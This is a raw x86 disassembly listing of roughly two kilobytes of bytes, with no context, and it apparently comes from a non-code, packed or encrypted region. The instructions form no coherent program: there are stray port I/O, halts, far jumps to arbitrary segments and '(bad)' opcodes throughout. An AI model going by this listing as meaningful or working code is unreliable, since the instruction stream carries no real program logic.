  41662b:	mov    esp,0xaea74580
  416630:	cmp    eax,DWORD PTR [esi]
  416632:	add    BYTE PTR [edi],cl
  416634:	xchg   esi,eax
  416635:	push   edi
  416636:	mov    ds:0x2305f24c,eax
  41663b:	leave  
  41663c:	test   DWORD PTR gs:[ebx],ebp
  41663f:	xchg   edx,eax
  416640:	push   ecx
  416641:	ss pop ecx
  416643:	popf   
  416644:	mov    ds:0xfbddbd8d,al
  416649:	test   DWORD PTR [esi+0x861363c],0x2230bbaf
  416653:	mov    esp,0x95bb2418
  416658:	inc    edx
  416659:	adc    eax,0xf2cac800
  41665e:	sbb    ecx,esi
  416660:	cld    
  416661:	pop    eax
  416662:	pushf  
  416663:	out    0x9,eax
  416665:	pop    esp
  416666:	add    al,0xea
  416668:	cmp    ecx,ecx
  41666a:	add    ecx,DWORD PTR ds:0x777f532b
  416670:	sbb    eax,0x122afbd5
  416675:	sub    cl,BYTE PTR [edi+ebp*1-0x29]
  416679:	jne    0x416676
  41667b:	sub    al,0xcb
  41667d:	cs js  0x416676
  416680:	mov    ah,0x25
  416682:	clc    
  416683:	mov    ch,0xd6
  416685:	pusha  
  416686:	xor    eax,0xc16c3980
  41668b:	aad    0x98
  41668d:	mov    BYTE PTR [ebp-0x26],ch
  416690:	cmp    ch,BYTE PTR [ebx]
  416692:	jae    0x416631
  416694:	sbb    eax,0x503821b0
  416699:	lea    ecx,[ebx-0x60]
  41669c:	sbb    eax,0x7a733c45
  4166a1:	cdq    
  4166a2:	adc    al,0xb3
  4166a4:	les    edx,FWORD PTR [esi+ecx*1-0x24]
  4166a8:	mov    bl,0x78
  4166aa:	repnz pop edx
  4166ac:	cdq    
  4166ad:	lock xor cl,BYTE PTR [edx+0x1e]
  4166b1:	aam    0x85
  4166b3:	and    eax,0xff5ebcae
  4166b8:	cmp    ebp,DWORD PTR [eax]
  4166ba:	jmp    0x48f3:0x41b8e43b
  4166c1:	push   0xc57a1d74
  4166c6:	aam    0xab
  4166c8:	jmp    0x6e28:0xca0584a6
  4166cf:	sub    DWORD PTR [eax],ecx
  4166d1:	fadd   QWORD PTR [ecx+0x614f324a]
  4166d7:	mov    ah,0xce
  4166d9:	rcl    BYTE PTR [ecx-0x38],0x2e
  4166dd:	lea    esi,[edi-0x4b]
  4166e0:	repz scas eax,DWORD PTR es:[edi]
  4166e2:	dec    bl
  4166e4:	push   esp
  4166e5:	stc    
  4166e6:	ret    
  4166e7:	jb     0x416745
  4166e9:	repnz and al,0xfe
  4166ec:	or     al,0xa1
  4166ee:	sbb    al,0x58
  4166f0:	mov    DWORD PTR ds:0xf5006e56,esp
  4166f6:	sbb    edi,DWORD PTR [ecx]
  4166f8:	ins    BYTE PTR es:[edi],dx
  4166f9:	dec    ecx
  4166fa:	in     eax,0x2b
  4166fc:	mov    al,0x1b
  4166fe:	jmp    0xdc1bad12
  416703:	mov    WORD PTR [ebx],gs
  416705:	jle    0x416743
  416707:	sbb    al,0x50
  416709:	cld    
  41670a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41670b:	cs xchg edx,esi
  41670e:	call   0x24f0576a
  416713:	and    BYTE PTR [eax-0x41137bb1],cl
  416719:	nop
  41671a:	or     ah,bl
  41671c:	test   eax,0xc6e29a2a
  416721:	jle    0x4166f3
  416723:	icebp  
  416724:	add    DWORD PTR [edx],eax
  416726:	shl    dh,0x2a
  416729:	daa    
  41672a:	inc    edi
  41672b:	aam    0x94
  41672d:	and    DWORD PTR [ecx],ebx
  41672f:	jae    0x416731
  416731:	xchg   BYTE PTR [ebx+0x50],bh
  416734:	or     al,0x8b
  416736:	mov    al,0x1c
  416738:	and    ecx,DWORD PTR [ecx-0x30624a4e]
  41673e:	mov    bl,0xd6
  416740:	call   0x9a2afa18
  416745:	aas    
  416746:	sub    al,0xfb
  416748:	push   esi
  416749:	inc    edi
  41674a:	adc    DWORD PTR [edi+0x7a1804c0],ebx
  416750:	cmp    BYTE PTR [eax-0x239b13c9],ah
  416756:	arpl   WORD PTR [edx-0x51],sp
  416759:	push   es
  41675a:	inc    eax
  41675b:	ins    BYTE PTR es:[edi],dx
  41675c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41675d:	fisttp WORD PTR [ebx-0x2c]
  416760:	jmp    0x9d74:0x333339ab
  416767:	mov    ds:0xe8b5e56f,al
  41676c:	aad    0x75
  41676e:	in     eax,0xbe
  416770:	hlt    
  416771:	adc    ebx,DWORD PTR [esi+0x1bf7d87d]
  416777:	xchg   ebp,eax
  416778:	out    dx,al
  416779:	push   es
  41677a:	add    ecx,edx
  41677c:	jno    0x41678f
  41677e:	push   0x9335cef
  416783:	xor    al,BYTE PTR [eax]
  416785:	ins    BYTE PTR es:[edi],dx
  416786:	add    cl,BYTE PTR [edx]
  416788:	mov    edx,0xc7f39216
  41678d:	rol    BYTE PTR [esi],cl
  41678f:	pop    esi
  416790:	das    
  416791:	or     eax,0x53060d00
  416796:	enter  0xe1f3,0x46
  41679a:	or     cl,0x18
  41679d:	lea    esi,[esi-0x57d98c53]
  4167a3:	cmp    al,0x2c
  4167a5:	dec    esp
  4167a6:	test   al,0xe4
  4167a8:	pop    esi
  4167a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167aa:	jb     0x4167fc
  4167ac:	cmp    BYTE PTR [ebp-0x33],bl
  4167af:	retf   
  4167b0:	popa   
  4167b1:	in     eax,dx
  4167b2:	jmp    0x8a7fb8cf
  4167b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167b8:	std    
  4167b9:	add    eax,0xd4ebd373
  4167be:	and    dh,bh
  4167c0:	jmp    0x3626fbec
  4167c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167c6:	add    edx,DWORD PTR [eax]
  4167c8:	fmul   QWORD PTR [esi-0x1d]
  4167cb:	int    0x3f
  4167cd:	push   ebp
  4167ce:	or     eax,0x92227b13
  4167d3:	jo     0x416828
  4167d5:	pop    es
  4167d6:	stc    
  4167d7:	sar    al,cl
  4167d9:	ret    0x7aea
  4167dc:	mov    ah,0x38
  4167de:	lods   eax,DWORD PTR ds:[esi]
  4167df:	inc    esi
  4167e0:	in     eax,dx
  4167e1:	add    DWORD PTR [esp+eax*8-0x36f21cb6],ecx
  4167e8:	aaa    
  4167e9:	or     eax,0xd02c2f89
  4167ee:	or     BYTE PTR [eax+0x12],ah
  4167f1:	mov    WORD PTR [ebx-0x5d6ac2cd],?
  4167f7:	add    esi,DWORD PTR ds:0x219be94
  4167fd:	arpl   bp,ax
  4167ff:	or     ah,BYTE PTR [edi-0x67da1438]
  416805:	mov    dl,0x93
  416807:	mov    ch,0x97
  416809:	nop
  41680a:	fbstp  TBYTE PTR [eax+0x5c94797e]
  416810:	icebp  
  416811:	rol    DWORD PTR ds:0x4808a194,1
  416817:	bound  edx,QWORD PTR [esi-0x4a]
  41681a:	jmp    0xe931d86f
  41681f:	add    al,0x92
  416821:	jmp    0xef66fe2e
  416826:	adc    BYTE PTR [edi+0x4c5fda91],bl
  41682c:	or     BYTE PTR [ebp-0x21],dh
  41682f:	retf   
  416830:	or     al,0xf8
  416832:	(bad)  
  416833:	aad    0xe4
  416835:	push   edi
  416836:	addr16 pusha 
  416838:	push   esp
  416839:	mov    eax,ds:0xb9b40b10
  41683e:	mov    ebx,0x11e54da8
  416843:	cdq    
  416844:	mov    ecx,0x2b232916
  416849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41684a:	push   eax
  41684b:	push   eax
  41684c:	(bad)  
  41684d:	call   0x6756ae59
  416852:	and    bl,BYTE PTR [ecx+0x613598a6]
  416858:	je     0x416838
  41685a:	mov    WORD PTR [ebp-0x560b8f03],?
  416860:	mov    dl,0xac
  416862:	aas    
  416863:	in     al,dx
  416864:	jg     0x4168e2
  416866:	aam    0xd2
  416868:	popa   
  416869:	pushf  
  41686a:	test   BYTE PTR cs:[esi-0x606f3437],al
  416871:	clc    
  416872:	hlt    
  416873:	popf   
  416874:	pop    esp
  416875:	mov    ds:0x1e2385ee,eax
  41687a:	mov    esp,0xb5643515
  41687f:	aam    0x47
  416881:	lods   eax,DWORD PTR ds:[esi]
  416882:	hlt    
  416883:	dec    esi
  416884:	inc    esp
  416885:	retf   0x601c
  416888:	or     ah,BYTE PTR [edi-0xc620d87]
  41688e:	fimul  WORD PTR [ebx-0x5c]
  416891:	inc    eax
  416892:	into   
  416893:	test   edi,0x1b645eda
  416899:	mov    BYTE PTR [esi+eiz*4],al
  41689c:	mov    esp,0x189df038
  4168a1:	inc    edx
  4168a2:	xchg   edi,eax
  4168a3:	js     0x4168ce
  4168a5:	cdq    
  4168a6:	jg     0x4168fc
  4168a8:	fmul   QWORD PTR [esi-0x72a2b9f1]
  4168ae:	js     0x4168e7
  4168b0:	or     eax,0x8ca97216
  4168b5:	outs   dx,BYTE PTR ds:[esi]
  4168b6:	cdq    
  4168b7:	in     eax,dx
  4168b8:	mov    bl,0x95
  4168ba:	cmc    
  4168bb:	adc    eax,0x36fd93a2
  4168c0:	out    0x9e,eax
  4168c2:	mov    cl,BYTE PTR [ebp+0xe]
  4168c5:	pop    esi
  4168c6:	sub    cl,BYTE PTR [edx+0x3a]
  4168c9:	mov    ch,0xcd
  4168cb:	push   0x8fb9340b
  4168d0:	jnp    0x4168d9
  4168d2:	(bad)  
  4168d3:	loop   0x4168cb
  4168d5:	xor    BYTE PTR [eax+eax*1-0x1d0130a1],ah
  4168dc:	jbe    0x416915
  4168de:	pop    ebx
  4168df:	mov    ebx,0xb230e21b
  4168e4:	int3   
  4168e5:	aas    
  4168e6:	push   0x5da2daa2
  4168eb:	dec    eax
  4168ec:	lods   al,BYTE PTR es:[esi]
  4168ee:	push   0x42703dc6
  4168f3:	jge    0x4168a4
  4168f5:	std    
  4168f6:	jmp    0x64a323e5
  4168fb:	bound  esi,QWORD PTR [eax+0x20]
  4168fe:	pop    ebp
  4168ff:	adc    al,0x10
  416901:	sbb    BYTE PTR [eax+0x650ba90e],dh
  416907:	inc    ebx
  416908:	in     al,0x27
  41690a:	adc    bl,dh
  41690c:	xor    eax,0x4ec76415
  416911:	aaa    
  416912:	xor    al,0x14
  416914:	adc    edx,DWORD PTR [ebx]
  416916:	popf   
  416917:	je     0x4168b5
  416919:	pop    edi
  41691a:	add    al,0x8e
  41691c:	add    esp,esp
  41691e:	xchg   ebx,eax
  41691f:	push   ecx
  416920:	into   
  416921:	and    eax,esi
  416923:	in     eax,dx
  416924:	ret    
  416925:	jno    0x416958
  416927:	jb     0x4168c9
  416929:	icebp  
  41692a:	or     al,0xeb
  41692c:	xor    DWORD PTR [ebx],ebx
  41692e:	aaa    
  41692f:	int3   
  416930:	stos   DWORD PTR es:[edi],eax
  416931:	add    cl,cl
  416933:	fisttp DWORD PTR [esi]
  416935:	pop    eax
  416936:	xchg   BYTE PTR [ebp+0x66],dh
  416939:	adc    al,bh
  41693b:	into   
  41693c:	and    eax,0x3623024e
  416941:	sar    BYTE PTR [esi],cl
  416943:	dec    ecx
  416944:	test   BYTE PTR [esi],ch
  416946:	addr16 cld 
  416948:	int    0x25
  41694a:	outs   dx,DWORD PTR ds:[esi]
  41694b:	or     DWORD PTR [esi+0x70dfc226],0x28
  416952:	xor    BYTE PTR [edi+0x9],al
  416955:	stc    
  416956:	jb     0x41692e
  416958:	inc    ecx
  416959:	jmp    0x6c197dcf
  41695e:	pusha  
  41695f:	inc    edx
  416960:	mov    ebp,0x472d2b37
  416965:	repz lea esp,[ecx+0x6bf7ad58]
  41696c:	nop
  41696d:	dec    esp
  41696e:	add    dh,ah
  416970:	js     0x4169b2
  416972:	out    dx,eax
  416973:	inc    edi
  416974:	pop    esi
  416975:	call   0xb078476c
  41697a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41697b:	adc    bl,dh
  41697d:	or     edx,DWORD PTR [esi-0x7721c6be]
  416983:	pusha  
  416984:	adc    al,0x99
  416986:	jno    0x41692e
  416988:	cmp    BYTE PTR [ebx],cl
  41698a:	jp     0x4169e5
  41698c:	rcr    ch,0x76
  41698f:	and    esi,DWORD PTR [esi+0x4c]
  416992:	push   edi
  416993:	add    DWORD PTR [ebp+0x26],esp
  416996:	push   ebx
  416997:	mov    ebx,0x11e4850f
  41699c:	mov    ebp,0xda5afb5d
  4169a1:	xchg   edi,eax
  4169a2:	sbb    DWORD PTR [eax-0x56bba4f3],esp
  4169a8:	das    
  4169a9:	jmp    0x416a17
  4169ab:	pop    ds
  4169ac:	mov    eax,0xe1cfa667
  4169b1:	lods   eax,DWORD PTR ds:[esi]
  4169b2:	call   0x9060:0xa8f8829d
  4169b9:	je     0x4169de
  4169bb:	inc    esp
  4169bc:	cdq    
  4169bd:	into   
  4169be:	repz pop es
  4169c0:	xor    eax,0x41b9810c
  4169c5:	enter  0x96e0,0xd
  4169c9:	cmp    edx,DWORD PTR [esi]
  4169cb:	mov    gs,WORD PTR es:[ecx-0x6c]
  4169cf:	push   0xffffffad
  4169d1:	outs   dx,BYTE PTR ds:[esi]
  4169d2:	sbb    esp,ecx
  4169d4:	int    0x1a
  4169d6:	test   eax,0xdde30668
  4169db:	fs xchg edi,eax
  4169dd:	shl    DWORD PTR [esi+0x5ea620c9],1
  4169e3:	sbb    ecx,DWORD PTR [esi+ecx*1-0x8]
  4169e7:	fsub   st,st(5)
  4169e9:	in     eax,0x73
  4169eb:	call   0x28d0:0xce03c2d6
  4169f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169f3:	fiadd  DWORD PTR [eax+0x44]
  4169f6:	or     eax,0xfac9cbda
  4169fb:	and    eax,0x9d7a2e43
  416a00:	jae    0x4169da
  416a02:	cli    
  416a03:	mov    dh,0xd3
  416a05:	cmp    al,0xaf
  416a07:	jae    0x4169b7
  416a09:	dec    esi
  416a0a:	fadd   st,st(7)
  416a0c:	pop    edi
  416a0d:	jbe    0x416a20
  416a0f:	int    0xc2
  416a11:	dec    ecx
  416a12:	outs   dx,DWORD PTR ds:[esi]
  416a13:	loope  0x4169bf
  416a15:	adc    al,0x82
  416a17:	aas    
  416a18:	loope  0x416a11
  416a1a:	pop    ss
  416a1b:	and    edx,DWORD PTR [ecx+ecx*1+0x22]
  416a1f:	popf   
  416a20:	jmp    0x4169c1
  416a22:	xor    eax,0xff97ba78
  416a27:	mov    al,0x5d
  416a29:	pop    ecx
  416a2a:	repz scas eax,DWORD PTR es:[edi]
  416a2c:	xchg   BYTE PTR [ebx+eax*8-0x30f5dc5f],cl
  416a33:	ffreep st(7)
  416a35:	xor    dh,BYTE PTR [ebx-0x780d0d61]
  416a3b:	jmp    0x346c41af
  416a40:	pop    ebp
  416a41:	xchg   esp,eax
  416a42:	ret    0x8d3c
  416a45:	inc    ebp
  416a46:	ficomp WORD PTR [eax-0x52]
  416a49:	adc    eax,0xbb7c2065
  416a4e:	jbe    0x416a0f
  416a50:	test   BYTE PTR [ebp-0x98fb182],ch
  416a56:	repnz dec ebx
  416a58:	and    esi,DWORD PTR [ecx+0x703decb7]
  416a5e:	hlt    
  416a5f:	out    0x27,eax
  416a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a62:	jl     0x416ad9
  416a64:	pop    edi
  416a65:	popf   
  416a66:	test   al,0x1d
  416a68:	add    DWORD PTR [ecx],esi
  416a6a:	push   edx
  416a6b:	mov    al,BYTE PTR [ecx+0x7]
  416a6e:	clc    
  416a6f:	push   edx
  416a70:	push   ebp
  416a71:	mov    ah,BYTE PTR [edx]
  416a73:	into   
  416a74:	bswap  esi
  416a76:	cld    
  416a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a78:	(bad)  
  416a79:	sbb    cl,dh
  416a7b:	and    bl,BYTE PTR ds:0x7e6871b1
  416a81:	and    eax,esp
  416a83:	fwait
  416a84:	ja     0x416a69
  416a86:	imul   ebp,ecx,0x3e
  416a89:	lea    ebp,[eax-0x3b]
  416a8c:	lea    ecx,[ecx+0x20]
  416a8f:	bound  ebx,QWORD PTR [ecx+0x32]
  416a92:	fsub   QWORD PTR [eax-0x766a9d94]
  416a98:	fs adc bl,bh
  416a9b:	mov    esi,0x2281e713
  416aa0:	push   es
  416aa1:	sar    bh,0x6d
  416aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aa5:	sar    ebp,0x7d
  416aa8:	mov    edx,0x1de6665
  416aad:	pop    ds
  416aae:	into   
  416aaf:	mov    DWORD PTR [eax+0x73d6546d],edx
  416ab5:	dec    eax
  416ab6:	jbe    0x416ae6
  416ab8:	dec    ebp
  416ab9:	mov    edx,edx
  416abb:	inc    eax
  416abc:	inc    ebx
  416abd:	cld    
  416abe:	imul   esi,DWORD PTR ds:0x577257df,0xe47f060c
  416ac8:	push   ss
  416ac9:	mov    BYTE PTR [esi-0x3d],0xf5
  416acd:	loope  0x416a8f
  416acf:	inc    eax
  416ad0:	fiadd  DWORD PTR [edi+0x505d0a13]
  416ad6:	popa   
  416ad7:	sbb    eax,0x6cd52322
  416adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416add:	ficom  WORD PTR [ebx-0x3d]
  416ae0:	out    dx,eax
  416ae1:	add    DWORD PTR [edi+0x3b006ae8],ebx
  416ae7:	adc    al,0x16
  416ae9:	ss cmp eax,0x953ebcb7
  416aef:	data16 mov ah,0xdd
  416af2:	repz sub ebx,0xffffffbd
  416af6:	xchg   BYTE PTR [ebx-0x16],al
  416af9:	mov    ds:0xab53dc9,al
  416afe:	neg    ebx
  416b00:	bound  ebp,QWORD PTR [ebp+esi*8-0x3d]
  416b04:	sub    BYTE PTR [ebp-0x6b9a4877],0xa3
  416b0b:	push   eax
  416b0c:	rcl    BYTE PTR ds:0x54bfdaf5,0xba
  416b13:	shr    DWORD PTR [edx],cl
  416b15:	cwde   
  416b16:	jle    0x416ad8
  416b18:	ret    0xbe51
  416b1b:	or     al,0xb9
  416b1d:	adc    ch,dl
  416b1f:	loope  0x416af6
  416b21:	dec    eax
  416b22:	or     ebp,DWORD PTR [eax+ebx*1+0x1dd5a7c8]
  416b29:	scas   al,BYTE PTR es:[edi]
  416b2a:	in     eax,0x73
  416b2c:	mov    ebp,0x6b3ba321
  416b31:	leave  
  416b32:	mov    esi,0x2e33951
  416b37:	adc    al,ah
  416b39:	dec    eax
  416b3a:	push   0xffffff9b
  416b3c:	xchg   ecx,eax
  416b3d:	mov    al,ds:0x2b7b94c
  416b42:	xor    eax,0xa3776997
  416b47:	xchg   ebx,eax
  416b48:	cli    
  416b49:	sub    al,0x57
  416b4c:	cmp    BYTE PTR [edi+ecx*4-0x71],dh
  416b50:	inc    esp
  416b51:	sbb    al,al
  416b53:	mov    ebx,0xc8e252f8
  416b58:	or     DWORD PTR [esi+0x64],0xfffffff2
  416b5c:	(bad)  
  416b5d:	mov    al,ds:0x2b95e46b
  416b62:	push   edi
  416b63:	fcmove st,st(7)
  416b65:	xchg   edx,eax
  416b66:	xor    bl,BYTE PTR [edx-0x2a88a045]
  416b6c:	imul   eax,DWORD PTR [edi+0x5e],0xffffff8d
  416b70:	jle    0x416bd2
  416b72:	ja     0x416afe
  416b74:	xor    eax,DWORD PTR [ecx+ecx*2]
  416b77:	xor    eax,0x23c0643a
  416b7c:	int3   
  416b7d:	and    edi,DWORD PTR [esi+esi*4+0x5b]
  416b81:	adc    cl,BYTE PTR [esi-0x72]
  416b84:	add    eax,0x3d2ccc9f
  416b89:	mov    ecx,0x6508b0a5
  416b8e:	aaa    
  416b8f:	add    esp,esp
  416b91:	shr    BYTE PTR [eax-0x2],1
  416b94:	in     eax,dx
  416b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b96:	sub    cl,BYTE PTR [edi-0x29ab579]
  416b9c:	gs fdivrp st(0),st
  416b9f:	push   esi
  416ba0:	mov    WORD PTR gs:[edi],cs
  416ba3:	xor    al,0x9c
  416ba5:	mov    ebp,0x16b66a9b
  416baa:	ja     0x416ba3
  416bac:	scas   eax,DWORD PTR es:[edi]
  416bad:	repz pop ecx
  416baf:	adc    eax,0x151ca22f
  416bb4:	xlat   BYTE PTR ds:[ebx]
  416bb5:	je     0x416c30
  416bb7:	mov    edx,?
  416bb9:	test   al,0x78
  416bbb:	pop    edi
  416bbc:	add    BYTE PTR [ebp-0x3f],bl
  416bbf:	mov    ah,0xcc
  416bc1:	push   ebp
  416bc2:	pop    esi
  416bc3:	mov    al,ds:0xe11100fa
  416bc8:	adc    BYTE PTR [edi],bl
  416bca:	dec    esp
  416bcb:	mov    dh,0x17
  416bcd:	cbw    
  416bcf:	ficom  WORD PTR [esi]
  416bd1:	pop    edi
  416bd2:	dec    ecx
  416bd3:	pop    ss
  416bd4:	jnp    0x416b62
  416bd6:	xor    DWORD PTR [ecx-0xb],0x6e
  416bda:	aad    0x92
  416bdc:	add    bh,BYTE PTR [esi+ebp*2-0x20]
  416be0:	cmp    BYTE PTR [esi-0x17aa4983],cl
  416be6:	in     al,dx
  416be7:	ds lock mov dh,0x46
  416beb:	jmp    0x629d:0x9a16f4b1
  416bf2:	mov    bh,BYTE PTR [edi+0x6c633352]
  416bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bf9:	mov    dl,0xf
  416bfb:	and    al,cl
  416bfd:	in     al,dx
  416bfe:	jb     0x416c7c
  416c00:	xchg   esi,eax
  416c01:	mov    ebx,0x114631f2
  416c06:	push   0x3e
  416c08:	inc    esi
  416c09:	(bad)
  416c0d:	mov    ch,BYTE PTR [edi-0x19]
  416c10:	or     eax,0x3f63ed88
  416c15:	add    esp,edi
  416c17:	jl     0x416c03
  416c19:	push   eax
  416c1a:	sub    eax,0x125a8557
  416c1f:	inc    ebx
  416c20:	pusha  
  416c21:	das    
  416c22:	ss ret 
  416c24:	pop    ebx
  416c25:	xchg   edi,eax
  416c26:	xchg   BYTE PTR [esi],cl
  416c28:	mov    ds:0x15f13104,eax
  416c2d:	outs   dx,DWORD PTR ds:[esi]
  416c2e:	aaa    
  416c2f:	pop    ebx
  416c30:	stos   BYTE PTR es:[edi],al
  416c31:	ss int3 
  416c33:	je     0x416c87
  416c35:	adc    bh,al
  416c37:	or     dl,BYTE PTR [ecx+0x2889456b]
  416c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c3e:	xchg   esi,eax
  416c3f:	jle    0x416bed
  416c41:	xor    eax,DWORD PTR [ecx+0x3d]
  416c44:	mov    ch,BYTE PTR [edx-0xff8c8ad]
  416c4a:	jmp    0xc247dbb9
  416c4f:	push   eax
  416c50:	adc    edx,DWORD PTR [ebx-0x4a]
  416c53:	and    al,0xa3
  416c55:	(bad)  
  416c56:	movups xmm7,XMMWORD PTR [ecx]
  416c59:	add    DWORD PTR [edi+esi*1-0x2c],0xef8f0e8c
  416c61:	test   DWORD PTR [edx],ebp
  416c63:	into   
  416c64:	inc    ecx
  416c65:	push   edi
  416c66:	mov    ch,0x3d
  416c68:	out    0xa2,al
  416c6a:	test   al,0x3c
  416c6c:	and    eax,DWORD PTR [ecx]
  416c6e:	mov    dh,BYTE PTR [esi+eiz*4-0x7f]
  416c72:	popa   
  416c73:	jb     0x416c5b
  416c75:	push   edx
  416c76:	jp     0x416cc3
  416c78:	fs repz pop esp
  416c7b:	hlt    
  416c7c:	or     edi,DWORD PTR [eax-0x6e]
  416c7f:	(bad)  
  416c80:	sub    eax,0x487fe6ff
  416c85:	add    al,0x54
  416c87:	xor    DWORD PTR [ebx+0x10],edx
  416c8a:	mov    ds:0x6419285b,eax
  416c8f:	jnp    0x416c5b
  416c91:	dec    esi
  416c92:	stos   DWORD PTR es:[edi],eax
  416c93:	sub    dh,bl
  416c95:	mov    ds:0x401fb1af,al
  416c9a:	mov    ecx,0x42118f18
  416c9f:	xchg   BYTE PTR [edx-0x31],cl
  416ca2:	add    BYTE PTR [eax-0x24],bl
  416ca5:	hlt    
  416ca6:	push   eax
  416ca7:	jge    0x416d1d
  416ca9:	jne    0x416cea
  416cab:	ficom  DWORD PTR [edi+0x14]
  416cae:	lods   al,BYTE PTR ds:[esi]
  416caf:	int3   
  416cb0:	sbb    BYTE PTR [eax-0x53],0x31
  416cb4:	adc    al,BYTE PTR [eax]
  416cb6:	sbb    DWORD PTR [edx+0x7d0375d],esp
  416cbc:	mov    ebx,0xd9ced47a
  416cc1:	fs fs scas eax,DWORD PTR es:[edi]
  416cc4:	mov    eax,0xf5f1138a
  416cc9:	scas   al,BYTE PTR es:[edi]
  416cca:	enter  0x4352,0x43
  416cce:	jl     0x416cc6
  416cd0:	stos   BYTE PTR es:[edi],al
  416cd1:	mov    eax,0x175d4dc1
  416cd6:	xor    ch,BYTE PTR [edi-0x1d584229]
  416cdc:	xchg   ebp,eax
  416cdd:	or     BYTE PTR [edi+0x4b],0xf2
  416ce1:	sbb    DWORD PTR [edi],edx
  416ce3:	data16 and BYTE PTR [esi+0x16],ah
  416ce7:	or     eax,0xd79770d9
  416cec:	pop    es
  416ced:	mov    ebx,0x74f9a9d5
  416cf2:	fdiv   DWORD PTR [ebx+0x41c39519]
  416cf8:	dec    ebp
  416cf9:	aad    0x9d
  416cfb:	outs   dx,DWORD PTR ds:[esi]
  416cfc:	int    0x18
  416cfe:	dec    edx
  416cff:	xor    ch,BYTE PTR [eax]
  416d01:	scas   al,BYTE PTR es:[edi]
  416d02:	jb     0x416d2d
  416d04:	idiv   esi
  416d06:	sahf   
  416d07:	mov    ch,0x71
  416d09:	inc    edx
  416d0a:	nop
  416d0b:	push   cs
  416d0c:	lods   al,BYTE PTR ds:[esi]
  416d0d:	cmp    esi,DWORD PTR [ebp+0x10b6c06c]
  416d13:	push   eax
  416d14:	pusha  
  416d15:	imul   esp,DWORD PTR [esi+0x18],0x7a6fba22
  416d1c:	clc    
  416d1d:	icebp  
  416d1e:	scas   eax,DWORD PTR es:[edi]
  416d1f:	mov    al,ds:0xc687929d
  416d24:	sahf   
  416d25:	push   ebx
  416d26:	scas   eax,DWORD PTR es:[edi]
  416d27:	adc    dl,dl
  416d29:	and    eax,0xa4a442ca
  416d2e:	add    dl,BYTE PTR [ebp+0x5a64ecd9]
  416d34:	jbe    0x416d09
  416d36:	mov    bh,0x76
  416d38:	out    dx,al
  416d39:	add    al,0x7c
  416d3b:	ds in  al,0x5a
  416d3e:	outs   dx,DWORD PTR ds:[esi]
  416d3f:	pop    ecx
  416d40:	mov    DWORD PTR [ecx+0x15],0xf24bd8cc
  416d47:	gs es pop ebx
  416d4a:	mov    eax,ds:0xa3435a6b
  416d4f:	dec    eax
  416d50:	aas    
  416d51:	pop    eax
  416d52:	fwait
  416d53:	aas    
  416d54:	fcomip st,st(1)
  416d56:	xchg   edi,eax
  416d57:	sub    BYTE PTR fs:[edi*4+0x61177d11],cl
  416d5f:	xchg   edi,eax
  416d60:	popf   
  416d61:	aas    
  416d62:	add    DWORD PTR [edx-0x61],esi
  416d65:	xchg   esi,eax
  416d66:	int3   
  416d67:	ret    0xb548
  416d6a:	imul   ecx,esp,0xffffffd1
  416d6d:	add    bl,bh
  416d6f:	jmp    0x416d98
  416d71:	out    dx,al
  416d72:	inc    ebx
  416d73:	pop    esi
  416d74:	mov    WORD PTR [ecx+0xa],ss
  416d77:	ficomp DWORD PTR [edi]
  416d79:	pop    ebx
  416d7a:	jp     0x416d35
  416d7c:	xor    DWORD PTR [edi-0x7dd7a60e],edx
  416d82:	push   eax
  416d83:	pop    esi
  416d84:	ja     0x416dad
  416d86:	push   ecx
  416d87:	lods   al,BYTE PTR ds:[esi]
  416d88:	imul   esi,ebx,0x8dc30c68
  416d8e:	and    al,0x2
  416d90:	dec    ebx
  416d91:	fsub   DWORD PTR [ecx]
  416d93:	mov    WORD PTR [edi+0x46063d58],fs
  416d99:	scas   eax,DWORD PTR es:[edi]
  416d9a:	sub    al,BYTE PTR [ebx-0x781ee700]
  416da0:	pop    esi
  416da1:	and    eax,0xdf4565d6
  416da6:	sbb    eax,0xe27d4e78
  416dab:	mov    al,0x41
  416dad:	mov    bl,0x48
  416daf:	dec    ebx
  416db0:	lea    eax,[eax-0x24ada98c]
  416db6:	xlat   BYTE PTR ds:[ebx]
  416db7:	cmp    al,BYTE PTR [edi-0x3e]
  416dba:	scas   al,BYTE PTR es:[edi]
  416dbb:	jmp    0x6f50a93d
  416dc0:	adc    bh,dl
  416dc2:	mov    al,0x99
  416dc4:	mov    ebp,0xbaa078c1
  416dc9:	mov    ecx,0x8d6227bd
  416dce:	mov    ds:0x84cdad57,eax
  416dd3:	iret   
  416dd4:	jg     0x416e55
  416dd6:	int3   
  416dd7:	popa   
  416dd8:	add    BYTE PTR [ebx+0x5fc15996],ch
  416dde:	add    DWORD PTR [ebx+0x609b234a],esi
  416de4:	(bad)  
  416de5:	mov    ebx,0x5012957b
  416dea:	push   ss
  416deb:	dec    esi
  416dec:	es nop
  416dee:	iret   
  416def:	push   es
  416df0:	fwait
  416df1:	(bad)  
  416df2:	pop    ebp
  416df3:	rcl    DWORD PTR [eax],0x1b
  416df6:	cld    
  416df7:	cmp    eax,0xc1bfc211
  416dfc:	out    0x17,eax
  416dfe:	pop    es
  416dff:	push   ebx
  416e00:	cmp    BYTE PTR [ebp+0x745f4568],al
  416e06:	pop    esi
  416e07:	jmp    0x416daa
  416e09:	cmp    DWORD PTR [edi-0x25451a41],ebx
  416e0f:	xchg   esp,eax
  416e10:	test   eax,0xc752b3af
  416e15:	inc    ebx
  416e16:	(bad)  
  416e17:	push   esi
  416e18:	enter  0xf0a9,0x6b
  416e1c:	aaa    
  416e1d:	mov    ebx,0x621f6819
  416e22:	cmp    dh,BYTE PTR [edx]
  416e24:	leave  
  416e25:	cmp    al,0xf4
